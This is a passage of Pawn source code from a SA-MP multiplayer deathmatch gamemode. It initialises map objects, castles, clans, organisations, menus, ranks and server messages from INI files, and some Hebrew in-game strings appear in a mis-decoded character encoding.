	CreateSObject(11443, -751.08087, 330.44662, 4.09069,   0.00000, 0.00000, 236.57025);
	CreateSObject(8553, -834.56561, 370.08960, 4.02800,   0.00000, 0.00000, 180.12340);
	CreateSObject(11443, -814.66254, 456.68307, 4.09069,   0.00000, 0.00000, 320.39322);
	CreateSObject(11458, -719.26813, 437.90536, 4.11666,   0.00000, 0.00000, 0.00000);
	CreateSObject(11457, -826.13574, 370.90802, 3.62760,   0.00000, 0.00000, 16.78033);
	CreateSObject(19362, -767.11200, 487.72079, 1.71800,   0.00000, 0.00000, 359.69699);
	CreateSObject(19362, -767.07233, 490.80988, 1.71800,   0.00000, 0.00000, 359.69699);
	CreateSObject(19362, -768.87140, 490.81924, -0.04643,   0.00000, 90.00000, 359.69699);
	CreateSObject(19362, -772.37701, 490.82422, -0.04643,   0.00000, 90.00000, 359.69699);
	CreateSObject(19362, -775.77435, 490.78992, -0.04643,   0.00000, 90.00000, 359.69699);
	CreateSObject(19362, -768.73010, 492.73160, -0.02640,   0.00000, 90.00000, 359.69699);
	// Air Castle
	/*CreateSObject(8499, -1110.27771, 2062.87744, 226.11232,   0.00000, 0.00000, 347.93576);
	CreateSObject(8499, -1087.23792, 1962.78577, 226.11232,   0.00000, 0.00000, 257.20624);
	CreateSObject(8499, -1225.61609, 1933.99158, 226.11232,   0.00000, 0.00000, 168.07193);
	CreateSObject(8499, -1245.62939, 2038.76099, 226.11232,   0.00000, 0.00000, 77.49319);
	CreateSObject(8620, -1157.47119, 1914.20142, 263.13193,   0.00000, 0.00000, 6.53637);
	CreateSObject(8620, -1177.10620, 2085.75195, 263.13193,   0.00000, 0.00000, 6.53637);
	CreateSObject(8620, -1157.47119, 1914.20142, 196.33060,   0.00000, 180.00000, 6.53640);
	CreateSObject(8620, -1177.66956, 2086.75488, 196.33060,   0.00000, 180.00000, 6.53640);
	CreateSObject(10757, -1231.90674, 2039.53369, 231.63480,   0.00000, 20.00000, 335.77481);
	CreateSObject(10757, -1133.24756, 1959.93054, 250.25577,   0.00000, -40.00000, 271.12170);
	CreateSObject(19335, -1229.01831, 1941.06982, 228.05675,   0.00000, 0.00000, 0.00000);
	CreateSObject(19337, -1079.89417, 1973.85730, 191.61603,   0.00000, 0.00000, 3.26552);
	CreateSObject(5006, -1185.56592, 1979.12402, 197.32550,   0.00000, 0.00000, 185.41248);
	CreateSObject(5006, -1124.12268, 1985.58533, 197.32550,   0.00000, 0.00000, 185.41248);
	CreateSObject(5006, -1247.79871, 1973.67676, 197.32550,   0.00000, 0.00000, 185.41248);
	CreateSObject(18753, -1211.48767, 1976.88599, 192.51939,   0.00000, 0.00000, 6.63200);
	CreateSObject(18753, -1118.19006, 1983.53101, 192.50740,   0.00000, 0.00000, 6.63200);
	CreateSObject(18753, -1129.15674, 2029.47009, 192.49741,   0.00000, 0.00000, 6.63204);
	CreateSObject(18753, -1214.63403, 2019.85559, 192.50740,   0.00000, 0.00000, 6.63200);
	CreateSObject(8397, -1078.64636, 2032.32092, 203.16223,   0.00000, 0.00000, 6.11466);
	CreateSObject(8397, -1070.05469, 1948.96814, 203.16223,   0.00000, 0.00000, 6.11466);
	CreateSObject(19335, -1140.15613, 2043.53784, 244.83711,   0.00000, 0.00000, 0.00000);
	CreateSObject(19337, -1252.87769, 2052.51147, 192.78831,   0.00000, 0.00000, 3.26552);
	CreateSObject(10838, -1107.71472, 2078.00952, 209.13538,   0.00000, 0.00000, 86.37189);
	CreateSObject(4828, -1166.87329, 1980.42407, 206.72272,   0.00000, 0.00000, 5.87505);
	CreateSObject(3277, -1167.07544, 1980.31433, 222.24005,   0.00000, 0.00000, 0.00000);
	CreateSObject(3267, -1167.09045, 1980.40759, 222.15436,   0.00000, 0.00000, 0.00000);
	CreateSObject(3393, -1142.79797, 1982.30408, 192.79425,   0.00000, 0.00000, 184.60616);
	CreateSObject(8558, -1161.02197, 1936.02063, 210.98326,   0.00000, 0.00000, 279.85440);
	CreateSObject(8558, -1171.15112, 2023.28650, 210.98326,   0.00000, 0.00000, 275.90768);
	CreateSObject(8558, -1175.30212, 2063.46338, 210.98326,   0.00000, 0.00000, 275.90768);*/
	// Liberty City Fix
	CreateSObject(972, -716.5, 503.3, 1370.7, 0.0000, 0.0000, 340.0, .interior = 1);
	CreateSObject(972, -726.7, 483.4, 1370.7, 0.0000, 0.0000, 325.0, .interior = 1);
	CreateSObject(972, -743.0, 467.8, 1368.7, 7.0000, 0.0000, 305.0, .interior = 1);
	CreateSObject(972, -763.0, 456.0, 1365.9, 9.0000, 0.0000, 298.0, .interior = 1);
	CreateSObject(972, -783.0, 449.8, 1362.3, 10.0000, 0.0000, 277.0, .interior = 1);
	CreateSObject(972, -807.0, 448.5, 1355.0, 10.0000, 0.0000, 270.0, .interior = 1);
	CreateSObject(972, -826.5, 448.0, 1352.0, 10.0000, 0.0000, 272.0, .interior = 1);
	CreateSObject(972, -851.0, 440.0, 1349.0, 7.0000, 0.0000, 300.0, .interior = 1);
	CreateSObject(972, -889.9, 443.7, 1343.0, 7.0000, 0.0000, 270.0, .interior = 1);
	CreateSObject(5013, -725.652161, 562.023499, 1371.099121, 0.0000, 0.0000, 0.0000, .interior = 1);
	CreateSObject(4848, -874.104431, 435.150482, 1349.465942, 0.0000, 0.0000, 0.0001, .interior = 1);
	CreateSObject(4848, -855.982300, 435.174103, 1354.285034, 0.0000, 0.0000, 0.0001, .interior = 1);
	CreateSObject(4848, -804.671631, 480.665039, 1361.186279, 0.0000, 11.1727, 180.0000, .interior = 1);
	CreateSObject(4848, -834.641724, 480.664063, 1355.247559, 0.0000, 11.1727, 180.0000, .interior = 1);
	CreateSObject(4848, -806.045532, 480.365143, 1373.529419, 0.0000, 0.8594, 180.0000, .interior = 1);
	CreateSObject(4848, -756.111450, 518.321411, 1375.094116, 0.0000, 0.8594, 180.8595, .interior = 1);
	CreateSObject(4848, -772.100830, 518.263733, 1379.733887, 0.0000, 0.8594, 180.0000, .interior = 1);
	CreateSObject(4848, -793.710205, 518.117249, 1384.037598, 0.0000, 0.8594, 180.0000, .interior = 1);
	CreateSObject(17531, -864.995300, 482.235596, 1351.666992, 359.1406, 0.8594, 270.0000, .interior = 1);
	CreateSObject(13132, -914.073608, 508.132416, 1349.237061, 0.0000, 0.0000, 180.0000, .interior = 1);
	CreateSObject(7019, -934.664063, 431.025208, 1349.476196, 0.0000, 0.0000, 0.0000, .interior = 1);
	CreateSObject(8428, -910.627625, 440.312592, 1349.088623, 0.0000, 0.0000, 90.0000, .interior = 1);
	CreateSObject(4848, -855.645020, 438.945221, 1345.907837, 0.0000, 354.8434, 0.0001, .interior = 1);
	CreateSObject(4848, -875.454407, 438.747284, 1343.991211, 0.0000, 353.9839, 0.0001, .interior = 1);
	CreateSObject(1505, -848.608521, 441.337158, 1351.965576, 0.0000, 0.0000, 0.0000, .interior = 1);
	CreateSObject(1505, -858.612671, 441.437134, 1351.079224, 0.0000, 0.0000, 0.0000, .interior = 1);
	CreateSObject(1505, -868.589294, 441.388519, 1349.965088, 0.0000, 0.0000, 0.0000, .interior = 1);
	CreateSObject(1505, -878.576965, 441.313538, 1349.047119, 0.0000, 0.0000, 0.0000, .interior = 1);
	CreateSObject(1505, -888.615784, 441.288544, 1348.006348, 0.0000, 0.0000, 0.0000, .interior = 1);
	CreateSObject(9949, -703.438599, 550.056519, 1382.989868, 0.0000, 0.0000, 0.0000, .interior = 1);
	CreateSObject(5013, -900.727417, 513.120178, 1346.012573, 0.0000, 0.0000, 0.0000, .interior = 1);
	CreateSObject(4848, -884.366943, 531.006165, 1349.648804, 0.0000, 0.0000, 270.0001, .interior = 1);
	CreateSObject(4848, -883.889954, 550.300049, 1349.684448, 0.0000, 0.0000, 270.0001, .interior = 1);
	CreateSObject(5013, -900.684570, 593.998413, 1346.017456, 0.0000, 0.0000, 180.0000, .interior = 1);
	CreateSObject(4848, -875.273499, 499.459778, 1348.134399, 0.0000, 0.0000, 0.0001, .interior = 1);
	CreateSObject(4848, -884.327698, 488.436554, 1348.088135, 2.5783, 0.0000, 90.0000, .interior = 1);
	CreateSObject(4848, -734.828003, 572.857483, 1367.383545, 0.0000, 0.0000, 90.0001, .interior = 1);
	CreateSObject(734, -732.628601, 472.514771, 1370.285400, 0.0000, 0.0000, 314.9999, .interior = 1);
	CreateSObject(733, -716.284668, 492.074341, 1366.064331, 0.0000, 0.0000, 213.7499, .interior = 1);
	CreateSObject(728, -719.145935, 500.967438, 1371.299561, 0.0000, 0.0000, 213.7499, .interior = 1);
	CreateSObject(4848, -846.882751, 587.402527, 1347.237671, 0.0000, 6.8755, 179.1406, .interior = 1);
	CreateSObject(4848, -850.967041, 589.097351, 1353.548340, 0.0000, 6.8755, 180.0000, .interior = 1);
	CreateSObject(4848, -824.483643, 587.991333, 1355.551270, 0.0000, 0.8594, 180.0000, .interior = 1);
	CreateSObject(4848, -796.856995, 588.045410, 1361.391846, 0.0000, 9.4538, 180.0000, .interior = 1);
	CreateSObject(4848, -775.656616, 588.053284, 1367.137573, 0.0000, 9.4538, 180.0000, .interior = 1);
	CreateSObject(4848, -756.108276, 588.042603, 1370.786743, 0.0000, 9.4538, 180.0000, .interior = 1);
	CreateSObject(4848, -883.014099, 510.687073, 1348.034912, 0.0000, 0.0000, 90.0000, .interior = 1);
	CreateSObject(4848, -884.493774, 515.007874, 1343.096069, 354.8434, 0.0000, 90.0000, .interior = 1);
	CreateSObject(4848, -754.299927, 578.769531, 1363.453491, 0.0000, 16.3293, 180.0000, .interior = 1);
	CreateSObject(3361, -847.857788, 440.793457, 1352.260498, 0.0000, 0.0000, 90.0000, .interior = 1);
	CreateSObject(3361, -857.862915, 440.701172, 1351.198853, 0.0000, 0.0000, 90.0000, .interior = 1);
	CreateSObject(3361, -867.894958, 440.738678, 1350.168579, 0.0000, 0.0000, 90.0000, .interior = 1);
	CreateSObject(3361, -877.888245, 440.863525, 1349.358765, 0.0000, 0.0000, 90.0000, .interior = 1);
	CreateSObject(3361, -887.785889, 440.722595, 1348.145142, 0.0000, 0.0000, 90.0000, .interior = 1);
	CreateSObject(4848, -738.696350, 542.280029, 1367.552856, 0.0000, 0.0000, 90.0001, .interior = 1);
	CreateSObject(13006, -941.916321, 546.667114, 1345.828491, 0.0000, 0.0000, 271.7189, .interior = 1);
	CreateSObject(10063, -924.531067, 590.264465, 1359.225342, 0.0000, 0.0000, 90.0000, .interior = 1);
	CreateSObject(18240, -929.708191, 567.417053, 1345.961182, 0.0000, 0.0000, 270.0003, .interior = 1);
	CreateSObject(18240, -944.678284, 533.118774, 1345.786255, 0.0000, 0.0000, 91.7189, .interior = 1);
	CreateSObject(10063, -901.039124, 609.322998, 1359.156860, 0.0000, 0.0000, 0.0000, .interior = 1);
	CreateSObject(4848, -875.037048, 586.984680, 1343.830322, 0.0000, 6.8755, 179.1406, .interior = 1);
	CreateSObject(823, -822.229797, 576.554932, 1355.513184, 0.0000, 0.0000, 0.0000, .interior = 1);
	CreateSObject(1506, -908.654480, 510.716705, 1346.181641, 0.0000, 0.0000, 270.0000, .interior = 1);
	CreateSObject(1506, -890.681885, 541.325989, 1346.206909, 0.0000, 0.0000, 270.0000, .interior = 1);
	CreateSObject(4848, -756.050232, 519.413513, 1375.231201, 0.0000, 0.8594, 0.0001, .interior = 1);
	CreateSObject(5017, -917.120911, 488.680817, 1349.390503, 0.0000, 0.0000, 0.0000, .interior = 1);
	CreateSObject(1506, -910.036682, 496.855438, 1346.124268, 0.0000, 0.0000, 270.0000, .interior = 1);
	CreateSObject(4848, -926.393188, 517.136658, 1347.422485, 0.0000, 0.0000, 0.0001, .interior = 1);
	CreateSObject(4848, -884.889160, 600.674744, 1342.463501, 0.0000, 0.0000, 270.0001, .interior = 1);
	CreateSObject(734, -750.758179, 447.288727, 1363.650513, 0.0000, 0.0000, 0.0000, .interior = 1);
	CreateSObject(4848, -744.253113, 550.316223, 1374.579102, 89.3814, 0.0000, 90.0001, .interior = 1);
	CreateSObject(4848, -744.223999, 532.379211, 1374.728516, 90.2408, 0.0000, 90.0001, .interior = 1);
	CreateSObject(4848, -744.254578, 587.676147, 1374.554077, 90.2408, 0.0000, 90.0001, .interior = 1);
	CreateSObject(4848, -747.039795, 550.154480, 1374.928711, 89.3814, 0.0000, 270.0001, .interior = 1);
	CreateSObject(4880, -715.171570, 596.169617, 1376.889893, 0.0000, 0.0000, 180.0000, .interior = 1);
	CreateSObject(733, -764.175720, 446.855011, 1364.118286, 0.0000, 0.0000, 281.2499, .interior = 1);
	CreateSObject(4848, -925.891418, 478.264862, 1347.077637, 356.5623, 0.0000, 0.0001, .interior = 1);
	CreateSObject(4848, -874.294617, 589.128784, 1350.319458, 0.0000, 4.2972, 0.0001, .interior = 1);
	// Castles
	for(new a = 0; a < sizeof(CastlesAreas); a++)
	{
		new c = CastlesAreas[a][caID], cstr[M_S+100];
		CreateArea(CastlesAreas[a][caMinx],CastlesAreas[a][caMiny],CastlesAreas[a][caMaxx],CastlesAreas[a][caMaxy],area_castle,c,0,0,CastlesAreas[a][caMinz],CastlesAreas[a][caMaxz]);
		cainfo[c][caStartCapture] = false,cainfo[c][caCapture] = -1,cainfo[c][caMissiles] = false,cainfo[c][caCaptureTime] = MAX_CASTLE_CAPTURE_TIME;
		cainfo[c][caGangZone] = GangZoneCreate(CastlesAreas[a][caMinx],CastlesAreas[a][caMiny],CastlesAreas[a][caMaxx],CastlesAreas[a][caMaxy]);
		format(cstr,sizeof(cstr),"Captures%d",a);
		cainfo[c][caCaptures] = fgetint("DM/Castles.ini",cstr);
		format(cstr,sizeof(cstr),"Kills%d",a);
		cainfo[c][caKills] = fgetint("DM/Castles.ini",cstr);
		format(cstr,sizeof(cstr),@c(lightblue)"%d {6DC5F3}:юёЇ° ёщух°щ\n{6DC5F3}∙э фшщ°ф: " @c(lightblue) "%s\n" @c(lightblue) "%d {6DC5F3}:ыюх· фысщ∙х· ∙фщх сшщ°ф цх\n" @c(lightblue) "%d {6DC5F3}:ыюх· фф°щтх· ∙фщх сшщ°ф цх\n" @c(lightblue) "%s {6DC5F3}:юрсщщўш фшщ°ф\n" @c(lightblue) "12/7/2014 {6DC5F3}:·р°щъ Єьщщф ь∙°·",a,CastlesAreas[a][caName],cainfo[c][caCaptures],cainfo[c][caKills],CastlesAreas[a][caAuthor]);
		cainfo[c][caText] = Create3DTextLabel(cstr,-1,CastlesAreas[a][caTreeX],CastlesAreas[a][caTreeY],CastlesAreas[a][caTreeZ],20.0,0,0);
	}
	for(new o = 0; o < sizeof(CastleMissilesInfo); o++)
	{
	    new a = CastleMissilesInfo[o][cmCastle];
	    cainfo[a][caMissile][o] = CreateSObject(3786,CastleMissilesInfo[o][cmX],CastleMissilesInfo[o][cmY],CastleMissilesInfo[o][cmZ],CastleMissilesInfo[o][cmRotX],CastleMissilesInfo[o][cmRotY],CastleMissilesInfo[o][cmRotZ]);
	}
	for(new i = 1; i < ssObjects; i++) AttachObjectToObject(ssObject[i],ssObject[0],ssObjectPos[i][0] - ssObjectPos[0][0],ssObjectPos[i][1] - ssObjectPos[0][1],ssObjectPos[i][2] - ssObjectPos[0][2],ssObjectPos[i][3],ssObjectPos[i][4],ssObjectPos[i][5]);
	SetObjectPos(ssObject[0],-1982.57,2052.56,0.0);
	SetObjectRot(ssObject[0],0.0,0.0,144.84);
	// Pirate Ship
	pirateUser[0] = INVALID_PLAYER_ID;
	ReloadPirateShip();
	pirateVehicle = CreateSpecialVehicle(473,1996.1755,1545.2629,10.3312,-200.4417,-1,-1,respawntime,world_pirateship,8493,SV_PIRATE,"Money Ship",1,0,.oz=17.0);
	// View HQs
	for(new x; x < MAX_VIEWHQS; x++)
	{
	    viewhqinfo[x][hqowner] = -1;
	    new stri[M_S];
	    format(stri, M_S, folder_hq "%d.ini", x);
	    if(fexist(stri))
		{
		    new owned = fgetint(stri, "HQOwner");
			if(owned == -1) LoadViewHQ(x);
			else
			{
			    new fstring[M_S];
			    format(fstring,sizeof(fstring),"/DM/Clans/%s.ini", claninfo[owned][cname]);
				if(!fgetint(fstring,"LockHQ") && owned != -1) SetTimerEx("LoadClanHeadquarter",400*x,0,"ii", owned, GetClanHQ(owned));
				viewhqinfo[x][hqvalid] = 1;
				viewhqinfo[x][hqsize] = fgetint(fstring, "HQSize");
			}
		}
	}
	// Clans
	dbg(11,"6d");
	new clanName[M_S], clansCount = fgetint(file_clans,"Count"), rule[16];
	if(clansCount > 0)
	{
		claninfo[0][cvalid] = 0;
		for(new i = 1; i < MAX_CLANS; i++) for(new j = 1; j < MAX_CLANS; j++) claninfo[j][cpeace][i] = false, claninfo[i][cpeace][j] = false, claninfo[j][cask][i] = false, claninfo[i][cask][j] = false;
		for(new i = 1; i < clansCount; i++)
		{
			valstr(string,i);
			format(clanName,sizeof(clanName),fgetstring(file_clans,string));
			if(equal(clanName,"None")) claninfo[i][cvalid] = 0;
			else
			{
				format(string,sizeof(string),"/DM/Clans/%s.ini",clanName);
				if(fexist(string))
				{
					MAXCLANS = i;
					claninfo[i][cvalid] = 1;
					format(claninfo[i][cname],256,fgetstring(string,"Name"));
					claninfo[i][cmembers] = 0;
					claninfo[i][chqid] = -1;
					claninfo[i][cbank] = fgetint(string,"Bank");
					claninfo[i][ccolor][0] = fgetint(string,"R");
					claninfo[i][ccolor][1] = fgetint(string,"G");
					claninfo[i][ccolor][2] = fgetint(string,"B");
					claninfo[i][chq][0] = fgetfloat(string,"X");
					claninfo[i][chq][1] = fgetfloat(string,"Y");
					claninfo[i][chq][2] = fgetfloat(string,"Z");
					claninfo[i][chq][3] = fgetfloat(string,"Rot");
					claninfo[i][chqv][0] = fgetfloat(string,"VX");
					claninfo[i][chqv][1] = fgetfloat(string,"VY");
					claninfo[i][chqv][2] = fgetfloat(string,"VZ");
					claninfo[i][chqv][3] = fgetfloat(string,"VR");
					format(claninfo[i][ccmd],256,fgetstring(string,"Command"));
					claninfo[i][ctest] = fgetint(string,"Test");
					claninfo[i][clbank] = fgetint(string,"LockBank");
					claninfo[i][cobjects] = 0;
					//claninfo[i][ccp] = 1;
					claninfo[i][cwarasked] = {0,-1};
					claninfo[i][cwarplayers] = 0;
					claninfo[i][cwarplayer] = INVALID_PLAYER_ID;
					claninfo[i][cinwar] = 0;
					claninfo[i][cwarcd] = 0;
					claninfo[i][cwintimes] = fgetint(string,"WarWinTimes");
					format(claninfo[i][cmessage],128,fgetstring(string,"Message"));
					for(new r = 1; r <= sizeof(crules[]); r++)
					{
						format(rule,sizeof(rule),"Rule%d",r);
						if(fkeyexist(string,rule)) format(crules[i][r-1],sizeof(crules[][]),fgetstring(string,rule));
						else crules[i][r-1] = "x";
					}
					claninfo[i][cchatlock] = 0;
					claninfo[i][cchatcolor][0] = fgetint(string,"ChatColor");
					claninfo[i][cchatcolor][1] = fgetint(string,"ChatColorL");
					claninfo[i][cchatpeace] = fgetint(string,"ChatWithPeace");
					for(new r = 1; r <= sizeof(csigns[]); r++)
					{
						format(rule,sizeof(rule),"Sign%d",r);
						if(fkeyexist(string,rule)) format(csigns[i][r-1],sizeof(csigns[][]),fgetstring(string,rule));
						else csigns[i][r-1] = "x";
					}
					claninfo[i][cmaxbank] = fgetint(string, "maxbank");
					claninfo[i][cusingpower] = 0;
					claninfo[i][cendpower] = {0,-1};
					claninfo[i][cgodobject] = 0;
					claninfo[i][cgodobjects] = 0;
					claninfo[i][cgzoneshow] = 1;//fgetint(string,"GangZoneShow");
					claninfo[i][cgzonesize] = 3;//fgetint(string,"GangZoneSize");
					claninfo[i][cruler] = fkeyexist(string,"Ruler") ? fgetint(string,"Ruler") : i;
					claninfo[i][cruling] = {0,0,0};
					claninfo[i][crulingtext] = INVALID_TEXT_DRAW;
					claninfo[i][cruletimes] = fgetint(string,"RuleWinTimes");
					for(new j = 0; j < max_clanperms; j++)
					{
						format(rule,sizeof(rule),"Permission%d",ClanPermissions[j][clpUniqueID]);
						if(!fkeyexist(string,rule))
						{
							fsetint(string,rule,ClanPermissions[j][clpDefault]);
							claninfo[i][cperms][j] = ClanPermissions[j][clpDefault];
						}
						else claninfo[i][cperms][j] = fgetint(string,rule);
					}
					for(new j = 0; j < max_clansystems; j++)
					{
						format(rule,sizeof(rule),"System%d",ClanSystems[j][clsUniqueID]);
						if(!fkeyexist(string,rule))
						{
							fsetint(string,rule,0);
							claninfo[i][csystems][j] = false;
						}
						else claninfo[i][csystems][j] = fgetint(string,rule) == 1;
						if(ClanSystems[j][clsParam] != -1)
						{
							format(rule,sizeof(rule),"System%dParam",ClanSystems[j][clsUniqueID]);
							if(!fkeyexist(string,rule))
							{
								fsetint(string,rule,ClanSystems[j][clsParam]);
								claninfo[i][csystemparam][j] = ClanSystems[j][clsParam];
							}
							else claninfo[i][csystemparam][j] = fgetint(string,rule);
						}
					}
					claninfo[i][cprotected] = fkeyexist(string,"Protected") && fgetint(string,"Protected") == 1;
					for(new j = 0; j < sizeof(cupowers); j++)
					{
						format(rule,sizeof(rule),"Power%d",cupowers[j][CUPID]);
						claninfo[i][cpowers][j] = fkeyexist(string,rule) && fgetint(string,rule) > 0;
					}
					for(new j = 1, cid = -1; j <= MAX_CLAN_ALLIANCES; j++)
					{
						claninfo[i][cpeace][j] = false, claninfo[i][cask][j] = false;
						format(rule,sizeof(rule),"Peace%d",j);
						if(fkeyexist(string,rule))
						{
							format(clanName,sizeof(clanName),fgetstring(string,rule));
							if(!equal(clanName,"None") && (cid = clannumber(clanName)) > 0) claninfo[i][cpeace][cid] = true;
						}
					}
					ClanPList_Create(i);
				}
			}
		}
		SetTeamCount(MAX_CLANS);
	}
	// Organizations
	dbg(11,"6e");
	new orgCount = fgetint(file_orgs,"Count");
	if(orgCount > 0)
	{
		orginfo[0][orgvalid] = 0;
		for(new i=1;i<orgCount;i++)
		{
			valstr(string,i);
			format(clanName,sizeof(clanName),fgetstring(file_orgs,string));
			if(equal(clanName,"None")) orginfo[i][orgvalid] = 0;
			else
			{
				format(string,sizeof(string),"/DM/Organizations/%s.ini",clanName);
				if(fexist(string))
				{
					orginfo[i][orgvalid] = 1;
					format(orginfo[i][oname],M_S,fgetstring(string,"Name"));
					orginfo[i][ohq][0] = fgetfloat(string,"X");
					orginfo[i][ohq][1] = fgetfloat(string,"Y");
					orginfo[i][ohq][2] = fgetfloat(string,"Z");
					orginfo[i][ohq][3] = fgetfloat(string,"Rot");
					orginfo[i][ohqv][0] = fgetfloat(string,"VX");
					orginfo[i][ohqv][1] = fgetfloat(string,"VY");
					orginfo[i][ohqv][2] = fgetfloat(string,"VZ");
					orginfo[i][ohqv][3] = fgetfloat(string,"VR");
					format(orginfo[i][ocmd],M_S,fgetstring(string,"Command"));
					SetTimerEx("LoadOrgHeadquarter",500*i,0,"i",i);
				}
			}
		}
	}
	dbg(11,"7");
	// Anti Swears
	new File:fwords = fopen(file_words,io_read), string2[M_S];
	while(fread(fwords,string)) if(strlen(string) > 1)
	{
		fixchars(string);
		for(new i = 0, j = strlen(string); i < j; i++) if(string[i] == '\n' || string[i] == '\r') string[i] = '\0';
		format(words[words_count++],sizeof(words[]),string);
	}
	fclose(fwords);
	// FTT Positions
	for(new i = 1; i <= MAX_FTTPOSITIONS; i++)
	{
		format(string2,sizeof(string2),"Pos%d",i);
		idx = 0;
		if(fkeyexist(file_ftt,string2))
		{
			format(string,sizeof(string),fgetstring(file_ftt,string2));
			for(new j = 0; j < 3; j++) FTTPositions[FTTPlaces][j] = floatstr(strtok(string,idx,','));
			FTTPlaces++;
		}
		else break;
	}
	dbg(11,"8");
	// TextDraw
	LoadTextDraws();
	dbg(11,"9");
	// TXD
    TXD[txd_map] = TextDrawCreate(120.0,20.0,"samaps:map");
    TextDrawFont(TXD[txd_map],4);
    TextDrawTextSize(TXD[txd_map],400.0,400.0);
	// VIP HQ Settings
	vgangzone = GangZoneCreate(2598.4583, 1608.1553, 2436.0249,1481.9521);
	dbg(11,"10");
	// Teleport Areas
	for(new i = 0; i < sizeof(Teleports); i++) CreateArea(Teleports[i][Tx]-55.0,Teleports[i][Ty]-55.0,Teleports[i][Tx]+55.0,Teleports[i][Ty]+55.0,Teleports[i][Tnoshooting] ? area_nstele : area_tele,i,Teleports[i][Ti],Teleports[i][Tw]);
	dbg(11,"11");
	// Bot Settings
	format(botname,sizeof(botname),fgetstring(file_bot,"Name"));
	botcolor = rgba2hex(fgetint(file_bot,"R"),fgetint(file_bot,"G"),fgetint(file_bot,"B"),255), boton = fgetint(file_bot,"Active");
	dbg(11,"12");
	// Menus
	bombshop = CreateMenu("Bomb shop",2,183.7500,130.6250,201.8750,150.8750);
	SetMenuColumnHeader(bombshop,0,"Name");
	SetMenuColumnHeader(bombshop,1,"Cost");
	AddBomb("Help",0,1);
	AddBomb("Bomb",100,1);
	AddBomb("Super Bomb",350,3);
	AddBomb("Time Bomb",400,4);
	AddBomb("Invisible Bomb",800,5);
	AddBomb("Kuriza",5000,7);
	AddBomb("Atom Bomb",20000,8);
	AddBomb("Hydrogen Bomb",25000,10);
	for(new i = 0; i < 3; i++)
	{
		if(i == 0)
		{
			areYouSure[i] = CreateMenu("Money Reset",1,209.3750,140.6250,292.5000,292.5000);
			SetMenuColumnHeader(areYouSure[i],0,"Are you sure you want to reset your money?");
		}
		if(i == 1)
		{
			areYouSure[i] = CreateMenu("Weapons Reset",1,209.3750,140.6250,292.5000,292.5000);
			SetMenuColumnHeader(areYouSure[i],0,"Are you sure you want to reset your weapons?");
		}
		if(i == 2)
		{
			areYouSure[i] = CreateMenu("Bank Money Reset",1,209.3750,140.6250,292.5000,292.5000);
			SetMenuColumnHeader(areYouSure[i],0,"Are you sure you want to reset your bank money?");
		}
		AddMenuItem(areYouSure[i],0,"Yes");
		AddMenuItem(areYouSure[i],0,"No");
	}
	shootingMenu = CreateMenu("Shooting",1,206.8750,138.1250,205.0000,205.0000);
	for(new i = 0; i < sizeof(Shooting); i++)
	{
		format(string,sizeof(string),"Shooting #%d",i + 1);
		AddMenuItem(shootingMenu,0,string);
	}
	sgarageMenu = CreateMenu("Special Garage",2,183.7500,130.6250,201.8750,150.8750);
	SetMenuColumnHeader(sgarageMenu,0,"Component");
	SetMenuColumnHeader(sgarageMenu,1,"Cost");
	AddSGarageComponent("Infinite Nitro",1200,"Ёщш°х ∙ьр Ётю°");
	AddSGarageComponent("Turbo",400,"шх°сх сьчщЎф Єь юў∙ фф·ўЇф с°ыс");
	AddSGarageComponent("Random Colors",12000,"ЎсЄщэ ю·чьЇщэ ь°ыс");
	AddSGarageComponent("Vehicle Rockets",25000,"рЇ∙°х· ь∙ьхч шщьщэ юф°ыс");
	stuntingMenu = "";
	for(new i = 0; i < sizeof(Stunting); i++)
	{
		format(stuntingMenu,sizeof(stuntingMenu),"%sStunting #%d%s",stuntingMenu,i + 1,i == sizeof(Stunting)-1 ? ("") : ("\n"));
		if(Stunting[i][stJumpFrom][0] != 0.0) Create3DTextLabel("- ьўЇхї юыря -",lightblue,Stunting[i][stJumpFrom][0],Stunting[i][stJumpFrom][1],Stunting[i][stJumpFrom][2],20.0,world_stunting,1);
	}
	dbg(11,"13");
	// Gamemode Sequrity
	new serverIP[M_S], serverName[M_S];
	GetConsoleVarAsString("bind",serverIP,sizeof(serverIP));
	GetConsoleVarAsString("hostname",serverName,sizeof(serverName));
	printf("serverIP = %s",serverIP);
	printf("srvip = %s",srvip);
	printf("serverName = %s",serverName);
	printf("hostname = %s",hostname);
	/*if((equal(serverIP,"127.0.0.1") || equal(serverIP,srvip)) && equal(serverName,hostname)) print(acname ": Current server is OK.");
	else
	{
		print(acname ": You can't steal my script.");
		SendRconCommand("exit");
		for(;;) exit;
	}*/
	dbg(11,"14");
	// NPCs Connecting
	SetTimer("ConnectNPCs",5000,0);
	dbg(11,"15");
	// Ranks
	for(new i = 0; i < MAX_RANKS; i++)
	{
		format(str,sizeof(str),"Rank%02d",i);
		if(fkeyexist(file_ranks,str)) format(rankname[i],sizeof(rankname[]),fgetstring(file_ranks,str));
		else rankname[i] = "None";
	}
	RecreateRanks();
	dbg(11,"16");
	// Second Auto Messages
	SAMs = 0;
	for(new j = 0; j < MAX_SAM; j++)
	{
		format(string,sizeof(string),"Message%02d",j);
		if(!fkeyexist(file_sam,string))
		{
		    if(!j) format(SecondAutoMessage[0], M_S, "Bug");
			break;
		}
		format(SecondAutoMessage[SAMs++],M_S,fgetstring(file_sam,string));
	}
	// Text Draw Auto Messages
	TDAMs = 0;
	for(new j = 0; j < MAX_TDAM; j++)
	{
		format(string,sizeof(string),"Message%02d",j);
		if(!fkeyexist(file_tdam,string))
		{
		    if(!j) format(TDAutoMessage[0], M_S, "Bug");
		    break;
		}
		format(TDAutoMessage[TDAMs++],64,fgetstring(file_tdam,string));
	}
	dbg(11,"17");
    tdam = TextDrawCreate(133.000000,423.000000," ");
	//tdam = TextDrawCreate(140.000000,400.000000," "); from dm6
	TextDrawBackgroundColor(tdam,253675775);
	TextDrawFont(tdam,1);
	TextDrawLetterSize(tdam,0.490000,1.600000);
	TextDrawColor(tdam,33023);
	TextDrawSetOutline(tdam,0);
	TextDrawSetProportional(tdam,1);
	TextDrawSetShadow(tdam,0);
	TextDrawUseBox(tdam,1);
	TextDrawBoxColor(tdam,32818);
	TextDrawTextSize(tdam,544.000000,0.000000);
	// Welcome Messages
	WMSGs = 0;
	for(new j = 0; j < MAX_WMSG; j++)
	{
		format(string,sizeof(string),"Message%02d",j);
  		if(!fkeyexist(file_wmsg,string))
		{
		    if(!j) format(WelcomeMessages[0], M_S, "Bug");
			break;
		}
		format(WelcomeMessages[WMSGs++],128,fgetstring(file_wmsg,string));
	}
	// Trivia Questions
	for(new j = 0; j <= MAX_TRIVIA; j++)
	{
		format(string,sizeof(string),"Question%02d",j);
